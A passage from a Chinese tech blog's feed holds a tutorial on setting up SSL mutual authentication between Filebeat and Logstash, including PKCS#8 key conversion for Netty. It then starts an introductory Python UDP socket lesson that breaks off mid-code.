class="line">./bin/elasticsearch-certutil ca</span><br></pre></td></tr></table></figure><p></p><p>使用默认输出文件名elastic-stack-ca.p12，并为证书设置访问口令。<br>根据证书文件导出一份CA公钥文件，用于后续各应用配置文件中引用CA公钥时使用：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -clcerts -nokeys -in elastic-stack-ca.p12 -out cacert.pem</span><br></pre></td></tr></table></figure><p></p><h2 id="制作Logstash使用的数字证书"><a href="#制作Logstash使用的数字证书" class="headerlink" title="制作Logstash使用的数字证书"></a>制作Logstash使用的数字证书</h2><p>Logstash服务在启用SSL加密通信支持时，会有一个特殊的问题。因为Logstash在底层是通过集成了Netty来提供的对外服务端口，而Netty在支持数字证书这一功能上面，有一个局限性，即Netty仅支持使用PKCS#8的密钥格式。<br>对于我们使用最多的PEM格式证书，Logstash会毫不留情地打印出以下异常信息：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[2019-08-06T14:48:35,643][ERROR][logstash.inputs.beats    ] Looks like you either have a bad certificate, an invalid key or your private key was not in PKCS8 format.</span><br><span class="line">[2019-08-06T14:48:35,643][WARN ][io.netty.channel.ChannelInitializer] Failed to initialize a channel. Closing: [id: 0x81e7ac55, L:/172.17.0.6:5044 - R:/100.200.106.60:32500]</span><br><span class="line">java.lang.IllegalArgumentException: File does not contain valid private key: /data/logstash/config/certs/logstash.key</span><br><span class="line">    at io.netty.handler.ssl.SslContextBuilder.keyManager(SslContextBuilder.java:270) ~[netty-all-4.1.30.Final.jar:4.1.30.Final]</span><br><span class="line">    at io.netty.handler.ssl.SslContextBuilder.forServer(SslContextBuilder.java:90) ~[netty-all-4.1.30.Final.jar:4.1.30.Final]</span><br><span class="line">    at org.logstash.netty.SslSimpleBuilder.build(SslSimpleBuilder.java:112) ~[logstash-input-beats-6.0.0.jar:?]</span><br></pre></td></tr></table></figure><p></p><p>由于Elastic官网上对于Filebeat和Logstash之间配置SSL加密通信时的说明资料对制作Logstash使用的数字证书的操作一带而过，只是简单的说既可以使用elasticsearch自带的证书工具，也可以使用通用的openssl。所以，按照Elastic技术栈中处理其它工具配置SSL功能支持时的方法，制作和得到PEM格式的证书后，便会遇到Logstash抛出的上面的异常信息了。<br>由于Logstash打印的错误信息比较多，分析了很长时间才定位到是由于未使用PKCS8密钥格式所引发的。<br>有兴趣进一步了解Netty这方面配置特性的同学，可以参考这个链接：<a href="https://netty.io/wiki/sslcontextbuilder-and-private-key.html" target="_blank" rel="noopener">https://netty.io/wiki/sslcontextbuilder-and-private-key.html</a> 。</p><a id="more"></a><h2 id="制作Logstash-Server证书的正确方法"><a href="#制作Logstash-Server证书的正确方法" class="headerlink" title="制作Logstash Server证书的正确方法"></a>制作Logstash Server证书的正确方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name logstash --dns testserver --ip 172.17.0.6 --pem</span><br><span class="line">unzip certificate-bundle.zip</span><br><span class="line">cd logstash</span><br><span class="line">openssl pkcs8 -in logstash.key -topk8 -nocrypt -out logstash.p8</span><br></pre></td></tr></table></figure><p>经由命令1，我们使用自签的CA签署生成了一份名为logstash的数字证书；<br>得到的数字证书是pem格式的，解压后会各有一个.key和.crt后缀的文件；<br>命令3，使用openssl转换出一份PKCS#8格式的密钥文件，即logstash.p8；<br>对于我们制作的logstash.crt的证书，可以使用以下命令查看证书中的信息：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -in logstash.crt -text</span><br></pre></td></tr></table></figure><p></p><h2 id="将证书文件部署到Logstash配置目录下"><a href="#将证书文件部署到Logstash配置目录下" class="headerlink" title="将证书文件部署到Logstash配置目录下"></a>将证书文件部署到Logstash配置目录下</h2><p>假定我们部署Logstash的路径为/data/logstash ，我们创建下面这样的证书存放目录，并把包括logstash证书和ca证书在内的文件部署于此。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data/logstash/config/certs</span><br><span class="line"></span><br><span class="line">$ ls /data/logstash/config/certs</span><br><span class="line">cacert.pem  logstash.crt  logstash.key  logstash.p8</span><br></pre></td></tr></table></figure><p></p><p>安全起见，将以上文件权限调整为600 。</p><h2 id="为Filebeat服务制作和配置数字证书"><a href="#为Filebeat服务制作和配置数字证书" class="headerlink" title="为Filebeat服务制作和配置数字证书"></a>为Filebeat服务制作和配置数字证书</h2><p>回到刚才我们制作CA证书的地方，继续为Filebeat生成一份数字证书：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name filebeat  --dns  test-filebeat --pem</span><br></pre></td></tr></table></figure><p></p><p>在生成证书时至少需要提供–dns参数的值，可以使用逗号分隔指定多个，简单处理的话可以直接指定为Filebeat工具所在主机的hostname即可。<br>也可以使用–ip为证书绑定IP地址，或者二者同时使用。<br>最终会得到一个zip文件，内含PEM格式的证书与密钥文件。<br>请将得到的数字证书和密钥文件，以及ca证书文件，存放到Filebeat以下部署路径中：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data/filebeat/certs</span><br><span class="line"></span><br><span class="line">ls /data/filebeat/certs</span><br><span class="line">filebeat.crt  filebeat.key  cacert.pem</span><br></pre></td></tr></table></figure><p></p><p>安全起见，将以上文件权限调整为600 。</p><h2 id="配置Filebeat使用SSL"><a href="#配置Filebeat使用SSL" class="headerlink" title="配置Filebeat使用SSL"></a>配置Filebeat使用SSL</h2><p>编辑filebeat.yml文件，参照以下内容进行配置：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">output.logstash:</span><br><span class="line">  hosts: [&quot;log.mytestserver.com:5044&quot;]</span><br><span class="line">  ssl.certificate_authorities: [&quot;/data/filebeat/certs/cacert.pem&quot;]</span><br><span class="line">  ssl.certificate: &quot;/data/filebeat/certs/filebeat.crt&quot;</span><br><span class="line">  ssl.key: &quot;/data/filebeat/certs/filebeat.key&quot;</span><br></pre></td></tr></table></figure><p></p><h2 id="配置Logstash在通过beats接收日志数据时使用SSL"><a href="#配置Logstash在通过beats接收日志数据时使用SSL" class="headerlink" title="配置Logstash在通过beats接收日志数据时使用SSL"></a>配置Logstash在通过beats接收日志数据时使用SSL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  beats &#123;</span><br><span class="line">    id =&gt; &quot;logstash-1&quot;</span><br><span class="line">    port =&gt; 5044</span><br><span class="line">    codec =&gt; plain &#123;</span><br><span class="line">      charset =&gt; &quot;UTF-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    ssl =&gt; true</span><br><span class="line">    ssl_certificate_authorities =&gt; [&quot;/data/logstash/config/certs/cacert.pem&quot;]</span><br><span class="line">    ssl_certificate =&gt; &quot;/data/logstash/config/certs/logstash.crt&quot;</span><br><span class="line">    ssl_key =&gt; &quot;/data/logstash/config/certs/logstash.p8&quot;</span><br><span class="line">    ssl_verify_mode =&gt; &quot;force_peer&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上所示，在ssl_key参数中，引用的是我们制作的PCKS#8格式的密钥文件。<br>Logstash的filter和output插件配置不是本文的重点，这里直接省略掉了。<br>启动Filebeat服务并观察日志<br>观察日志输出，显示有类似以下信息时表示Filebeat正常连接到Logstash服务且SSL功能工作正常。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019-08-06T16:29:08.745+0800INFOpipeline/output.go:95Connecting to backoff(async(tcp://log.mytestserver.com:5044))</span><br><span class="line">2019-08-06T16:29:08.992+0800INFOpipeline/output.go:105Connection to backoff(async(tcp://log.mytestserver.com:5044)) established</span><br></pre></td></tr></table></figure><p></p><p>参考材料：<a href="https://www.elastic.co/guide/en/beats/filebeat/7.2/configuring-ssl-logstash.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/beats/filebeat/7.2/configuring-ssl-logstash.html</a></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;p&gt;在目前比较流行的技术实践方案里，Filebeat大多用作日志采集工具，虽然它可以直接将数据写入Elasticsearch中，但出于各方面的效率考虑，一般都会通过Logstash做一个日志数据的汇聚、转换和分发处理。&lt;br&gt;为了保证应用日志数据的传输安全，我们可以使用SSL相互身份验证来保护Filebeat和Logstash之间的连接。 这可以确保Filebeat仅将加密数据发送到受信任的Logstash服务器，并确保Logstash服务器仅从受信任的Filebeat客户端接收数据。&lt;br&gt;下面就讲述一下配置Filebeat与Logstash之间进行加密通信的方法。全文是在CentOS7上基于Elastic 7.2技术栈所验证的。&lt;/p&gt;&lt;p&gt;我们需要一个自签的CA证书，以及使用该CA证书签署的两份数据证书。一份是给Logstash作为server端验证自己身份时使用，一份是提供给Filebeat客户端验证自己身份使用。&lt;/p&gt;&lt;p&gt;在这里，我们是直接利用的Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil来制作需要的证书。如果您需要对该工具做更多的了解，参考官网的这个资料：elasticsearch-certutil&lt;/p&gt;&lt;h2 id=&quot;制作自签的CA证书&quot;&gt;&lt;a href=&quot;#制作自签的CA证书&quot; class=&quot;headerlink&quot; title=&quot;制作自签的CA证书&quot;&gt;&lt;/a&gt;制作自签的CA证书&lt;/h2&gt;&lt;p&gt;在Linux下，进入到Elasticsearch程序的部署家目录中，执行以下命令可以生成一份自签的CA证书：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;./bin/elasticsearch-certutil ca&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;使用默认输出文件名elastic-stack-ca.p12，并为证书设置访问口令。&lt;br&gt;根据证书文件导出一份CA公钥文件，用于后续各应用配置文件中引用CA公钥时使用：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;openssl pkcs12 -clcerts -nokeys -in elastic-stack-ca.p12 -out cacert.pem&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;h2 id=&quot;制作Logstash使用的数字证书&quot;&gt;&lt;a href=&quot;#制作Logstash使用的数字证书&quot; class=&quot;headerlink&quot; title=&quot;制作Logstash使用的数字证书&quot;&gt;&lt;/a&gt;制作Logstash使用的数字证书&lt;/h2&gt;&lt;p&gt;Logstash服务在启用SSL加密通信支持时，会有一个特殊的问题。因为Logstash在底层是通过集成了Netty来提供的对外服务端口，而Netty在支持数字证书这一功能上面，有一个局限性，即Netty仅支持使用PKCS#8的密钥格式。&lt;br&gt;对于我们使用最多的PEM格式证书，Logstash会毫不留情地打印出以下异常信息：&lt;br&gt;&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[2019-08-06T14:48:35,643][ERROR][logstash.inputs.beats    ] Looks like you either have a bad certificate, an invalid key or your private key was not in PKCS8 format.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[2019-08-06T14:48:35,643][WARN ][io.netty.channel.ChannelInitializer] Failed to initialize a channel. Closing: [id: 0x81e7ac55, L:/172.17.0.6:5044 - R:/100.200.106.60:32500]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;java.lang.IllegalArgumentException: File does not contain valid private key: /data/logstash/config/certs/logstash.key&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    at io.netty.handler.ssl.SslContextBuilder.keyManager(SslContextBuilder.java:270) ~[netty-all-4.1.30.Final.jar:4.1.30.Final]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    at io.netty.handler.ssl.SslContextBuilder.forServer(SslContextBuilder.java:90) ~[netty-all-4.1.30.Final.jar:4.1.30.Final]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    at org.logstash.netty.SslSimpleBuilder.build(SslSimpleBuilder.java:112) ~[logstash-input-beats-6.0.0.jar:?]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;由于Elastic官网上对于Filebeat和Logstash之间配置SSL加密通信时的说明资料对制作Logstash使用的数字证书的操作一带而过，只是简单的说既可以使用elasticsearch自带的证书工具，也可以使用通用的openssl。所以，按照Elastic技术栈中处理其它工具配置SSL功能支持时的方法，制作和得到PEM格式的证书后，便会遇到Logstash抛出的上面的异常信息了。&lt;br&gt;由于Logstash打印的错误信息比较多，分析了很长时间才定位到是由于未使用PKCS8密钥格式所引发的。&lt;br&gt;有兴趣进一步了解Netty这方面配置特性的同学，可以参考这个链接：&lt;a href=&quot;https://netty.io/wiki/sslcontextbuilder-and-private-key.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://netty.io/wiki/sslcontextbuilder-and-private-key.html&lt;/a&gt; 。&lt;/p&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>网络_udp</title>
    <link href="https://yongnights.github.io/2019/12/31/%E7%BD%91%E7%BB%9C_udp/"/>
    <id>https://yongnights.github.io/2019/12/31/网络_udp/</id>
    <published>2019-12-31T04:00:48.286Z</published>
    <updated>2019-12-31T04:00:48.287Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h1 id="网络通信概述"><a href="#网络通信概述" class="headerlink" title="网络通信概述"></a>网络通信概述</h1><ol><li><p>什么是网络<br>一种辅助双方或者多方能够连接在一起的工具</p></li><li><p>使用网络的目的<br>就是为了联通多方然后进行通信用的，即把数据从一方传递给另外一方,为了让在不同的电脑上运行的软件之间能够互相传递数据，就需要借助网络的功能</p></li></ol><p>小总结:</p><ul><li>使用网络能够把多方链接在一起，然后可以进行数据传递</li><li>所谓的网络编程就是，让在不同的电脑上的软件能够进行数据传递，即进程之间的通信</li></ul><p><img src="/images_udp/001.png" alt></p><a id="more"></a><h1 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h1><ol><li><p>什么是IP地址<br>用来在网络中标记一台电脑，比如192.168.1.1；在本地局域网上是唯一的。</p></li><li><p>ip地址的作用</p></li></ol><p><img src="/images_udp/002.png" alt></p><ol start="3"><li>ip地址的分类（了解）<br>每一个IP地址包括两部分：网络地址和主机地址<br><img src="/images_udp/003.png" alt></li></ol><h2 id="A类IP地址"><a href="#A类IP地址" class="headerlink" title="A类IP地址"></a>A类IP地址</h2><p>一个A类IP地址由1字节的网络地址和3字节主机地址组成，网络地址的最高位必须是“0”，<br>地址范围1.0.0.1-126.255.255.254<br>二进制表示为：00000001 00000000 00000000 00000001 - 01111110 11111111 11111111 11111110<br>可用的A类网络有126个，每个网络能容纳1677214个主机</p><h2 id="B类IP地址"><a href="#B类IP地址" class="headerlink" title="B类IP地址"></a>B类IP地址</h2><p>一个B类IP地址由2个字节的网络地址和2个字节的主机地址组成，网络地址的最高位必须是“10”，<br>地址范围128.1.0.1-191.255.255.254<br>二进制表示为：10000000 00000001 00000000 00000001 - 10111111 11111111 11111111 11111110<br>可用的B类网络有16384个，每个网络能容纳65534主机</p><h2 id="C类IP地址"><a href="#C类IP地址" class="headerlink" title="C类IP地址"></a>C类IP地址</h2><p>一个C类IP地址由3字节的网络地址和1字节的主机地址组成，网络地址的最高位必须是“110”<br>范围192.0.1.1-223.255.255.254<br>二进制表示为: 11000000 00000000 00000001 00000001 - 11011111 11111111 11111110 11111110<br>C类网络可达2097152个，每个网络能容纳254个主机</p><h2 id="D类地址用于多点广播"><a href="#D类地址用于多点广播" class="headerlink" title="D类地址用于多点广播"></a>D类地址用于多点广播</h2><p>D类IP地址第一个字节以“1110”开始，它是一个专门保留的地址。<br>它并不指向特定的网络，目前这一类地址被用在多点广播（Multicast）中<br>多点广播地址用来一次寻址一组计算机 s 地址范围224.0.0.1-239.255.255.254</p><h2 id="E类IP地址"><a href="#E类IP地址" class="headerlink" title="E类IP地址"></a>E类IP地址</h2><p>以“1111”开始，为将来使用保留<br>E类地址保留，仅作实验和开发用</p><h2 id="私有ip"><a href="#私有ip" class="headerlink" title="私有ip"></a>私有ip</h2><p>在这么多网络IP中，国际规定有一部分IP地址是用于我们的局域网使用，也就是属于私网IP，不在公网中使用的，它们的范围是：<br>10.0.0.0～10.255.255.255<br>172.16.0.0～172.31.255.255<br>192.168.0.0～192.168.255.255</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>IP地址127．0．0．1~127．255．255．255用于回路测试，<br>如：127.0.0.1可以代表本机IP地址，用<a href="http://127.0.0.1就可以测试本机中配置的Web服务器。" target="_blank" rel="noopener">http://127.0.0.1就可以测试本机中配置的Web服务器。</a></p><h1 id="Linux命令-ping-ifconfig"><a href="#Linux命令-ping-ifconfig" class="headerlink" title="Linux命令(ping, ifconfig)"></a>Linux命令(ping, ifconfig)</h1><h2 id="查看或配置网卡信息：ifconfig"><a href="#查看或配置网卡信息：ifconfig" class="headerlink" title="查看或配置网卡信息：ifconfig"></a>查看或配置网卡信息：ifconfig</h2><p>敲：ifconfig，它会显示所有网卡的信息<br><img src="/images_udp/004.png" alt></p><p><img src="/images_udp/005.png" alt></p><h2 id="测试远程主机连通性：ping"><a href="#测试远程主机连通性：ping" class="headerlink" title="测试远程主机连通性：ping"></a>测试远程主机连通性：ping</h2><p>通常用ping来检测网络是否正常<br><img src="/images_udp/006.png" alt></p><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h2 id="什么是端口"><a href="#什么是端口" class="headerlink" title="什么是端口"></a>什么是端口</h2><p>端口就好一个房子的门，是出入这间房子的必经之路。如果一个程序需要收发网络数据，那么就需要有这样的端口.在linux系统中，端口可以有65536（2的16次方）个之多！既然有这么多，操作系统为了统一管理，所以进行了编号，这就是<code>端口号</code>。</p><h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><p>端口是通过端口号来标记的，端口号只有整数，范围是从0到65535<br>注意：端口数不一样的*nix系统不一样，还可以手动修改</p><h2 id="端口是怎样分配的"><a href="#端口是怎样分配的" class="headerlink" title="端口是怎样分配的"></a>端口是怎样分配的</h2><p>端口号不是随意使用的，而是按照一定的规定进行分配。<br>端口的分类标准有好几种，我们这里不做详细讲解，只介绍一下知名端口和动态端口</p><h3 id="知名端口（Well-Known-Ports）"><a href="#知名端口（Well-Known-Ports）" class="headerlink" title="知名端口（Well Known Ports）"></a>知名端口（Well Known Ports）</h3><p>知名端口是众所周知的端口号，范围从0到1023<br>80端口分配给HTTP服务<br>21端口分配给FTP服务<br>可以理解为，一些常用的功能使用的号码是估计的，好比 电话号码110、10086、10010一样<br>一般情况下，如果一个程序需要使用知名端口的需要有root权限。</p><h3 id="动态端口（Dynamic-Ports）"><a href="#动态端口（Dynamic-Ports）" class="headerlink" title="动态端口（Dynamic Ports）"></a>动态端口（Dynamic Ports）</h3><p>动态端口的范围是从1024到65535<br>之所以称为动态端口，是因为它一般不固定分配某种服务，而是动态分配。<br>动态分配是指当一个系统程序或应用程序程序需要网络通信时，它向主机申请一个端口，主机从可用的端口号中分配一个供它使用。<br>当这个程序关闭时，同时也就释放了所占用的端口号。</p><h3 id="怎样查看端口-？"><a href="#怎样查看端口-？" class="headerlink" title="怎样查看端口 ？"></a>怎样查看端口 ？</h3><ul><li>用“netstat －an”查看端口状态</li><li>lsof -i [tcp/udp]:2425</li></ul><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>端口有什么用呢 ？ 我们知道，一台拥有IP地址的主机可以提供许多服务，比如HTTP（万维网服务）、FTP（文件传输）、SMTP（电子邮件）等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。 需要注意的是，端口并不是一一对应的。比如你的电脑作为客户机访问一台WWW服务器时，WWW服务器使用“80”端口与你的电脑通信，但你的电脑则可能使用“3457”这样的端口。</p><h1 id="socket简介"><a href="#socket简介" class="headerlink" title="socket简介"></a>socket简介</h1><h2 id="不同电脑上的进程之间如何通信"><a href="#不同电脑上的进程之间如何通信" class="headerlink" title="不同电脑上的进程之间如何通信"></a>不同电脑上的进程之间如何通信</h2><p>首要解决的问题是如何唯一标识一个进程，否则通信无从谈起！<br>在1台电脑上可以通过进程号（PID）来唯一标识一个进程，但是在网络中这是行不通的。<br>其实TCP/IP协议族已经帮我们解决了这个问题，网络层的“ip地址”可以唯一标识网络中的主机，而传输层的“协议+端口”可以唯一标识主机中的应用进程（进程）。<br>这样利用ip地址，协议，端口就可以标识网络的进程了，网络中的进程通信就可以利用这个标志与其它进程进行交互。<br>注意:</p><ul><li>所谓进程指的是：运行的程序以及运行时用到的资源这个整体称之为进程（在讲解多任务编程时进行详细讲解）</li><li>所谓进程间通信指的是：运行的程序之间的数据共享</li><li>后面课程中会详细说到，像网络层等知识，不要着急</li></ul><h2 id="什么是socket"><a href="#什么是socket" class="headerlink" title="什么是socket"></a>什么是socket</h2><p>socket(简称 套接字) 是进程间通信的一种方式，它与其他进程间通信的一个主要不同是：<br>它能实现不同主机间的进程间通信，我们网络上各种各样的服务大多都是基于 Socket 来完成通信的<br>例如我们每天浏览网页、QQ 聊天、收发 email 等等</p><p>socket套接字走的是全双工</p><h2 id="创建socket"><a href="#创建socket" class="headerlink" title="创建socket"></a>创建socket</h2><p>在 Python 中 使用socket 模块的函数 socket 就可以完成：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">socket.socket(AddressFamily, Type)</span><br></pre></td></tr></table></figure><p></p><p>说明：<br>函数 socket.socket 创建一个 socket，该函数带有两个参数：</p><ul><li>Address Family：可以选择 AF_INET（用于 Internet 进程间通信） 或者 AF_UNIX（用于同一台机器进程间通信）,实际工作中常用AF_INET</li><li>Type：套接字类型，可以是 SOCK_STREAM（流式套接字，主要用于 TCP 协议）或者 SOCK_DGRAM（数据报套接字，主要用于 UDP 协议）</li></ul><p>创建一个tcp socket（tcp套接字）<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建tcp的套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...这里是使用套接字的功能（省略）...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不用的时候，关闭套接字</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p></p><p>创建一个udp socket（udp套接字）<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建udp的套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...这里是使用套接字的功能（省略）...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不用的时候，关闭套接字</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p></p><p>说明</p><ul><li>套接字使用流程 与 文件的使用流程很类似<ol><li>创建套接字</li><li>使用套接字收/发数据</li><li>关闭套接字</li></ol></li></ul><h1 id="udp网络程序-发送、接收数据"><a href="#udp网络程序-发送、接收数据" class="headerlink" title="udp网络程序-发送、接收数据"></a>udp网络程序-发送、接收数据</h1><h2 id="udp网络程序-发送数据"><a href="#udp网络程序-发送数据" class="headerlink" title="udp网络程序-发送数据"></a>udp网络程序-发送数据</h2><p>创建一个基于udp的网络程序流程很简单，具体步骤如下：</p><pre><code>1. 创建客户端套接字2. 发送/接收数据3. 关闭套接字</code></pre><p><img src="/images_udp/007.png" alt></p><p>代码如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 创建udp套接字</span></span><br><span class="line">udp_socket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 准备接收方的地址</span></span><br><span class="line"><span class="comment"># '192.168.1.103'表示目的ip地址</span></span><br><span class="line"><span class="comment"># 8080表示目的端口</span></span><br><span class="line">dest_addr = (<span class="string">'192.168.1.103'</span>, <span class="number">8080</span>)  <span class="comment"># 注意 是元组，ip是字符串，端口是数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 从键盘获取数据</span></span><br><span class="line">send_data = input(<span class="string">"请输入要发送的数据:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 发送数据到指定的电脑上的指定程序中</span></span><br><span class="line">udp_socket.sendto(send_data.encode(<span class="string">'utf-8'</span>), dest_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 关闭套接字</span></span><br><span class="line">udp_socket.close()</span><br></pre></td></tr></table></figure><p></p><p>运行现象：<br>在Ubuntu中运行脚本：<br><img src="/images_udp/008.png" alt></p><p>在windows中运行“网络调试助手”：<br><img src="/images_udp/009.png" alt></p><h2 id="udp网络程序-发送、接收数据-1"><a href="#udp网络程序-发送、接收数据-1" class="headerlink" title="udp网络程序-发送、接收数据"></a>udp网络程序-发送、接收数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 